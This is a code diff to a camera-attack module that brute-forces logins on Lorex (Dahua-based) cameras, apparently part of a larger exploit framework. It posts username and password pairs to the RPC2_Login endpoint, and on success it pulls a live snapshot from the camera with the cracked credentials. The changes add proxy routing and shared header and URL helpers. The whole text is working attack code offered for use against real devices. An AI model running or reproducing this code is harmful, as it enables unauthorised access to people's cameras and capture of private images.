@@ -20,11 +20,11 @@ class LorexWeakPassword(POCTemplate):
     def verify(self, ip, port=80):
         """Lorex devices use Dahua-based firmware with RPC2 login"""
         headers = {
-            'User-Agent': self.config.user_agent,
+            **self._get_headers(),
             'Host': ip,
             'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Connection': 'close',
         }
+        proxies = self._get_proxies()
         for user in self.config.users:
             for password in self.config.passwords:
                 _json = {
@@ -42,11 +42,12 @@ class LorexWeakPassword(POCTemplate):
                 }
                 try:
                     r = requests.post(
-                        f"http://{ip}:{port}/RPC2_Login",
+                        self._get_url(ip, port, '/RPC2_Login'),
                         headers=headers,
                         json=_json,
                         verify=False,
-                        timeout=self.config.timeout
+                        timeout=self.config.timeout,
+                        proxies=proxies
                     )
                     if r.status_code == 200 and r.json().get('result') == True:
                         return ip, str(port), self.product, str(user), str(password), self.name
@@ -57,7 +58,7 @@ class LorexWeakPassword(POCTemplate):
     def exploit(self, results):
         ip, port, product, user, password, vul = results
         img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-        url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
+        url = self._get_url(ip, port, '/cgi-bin/snapshot.cgi')
         return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))
 
 
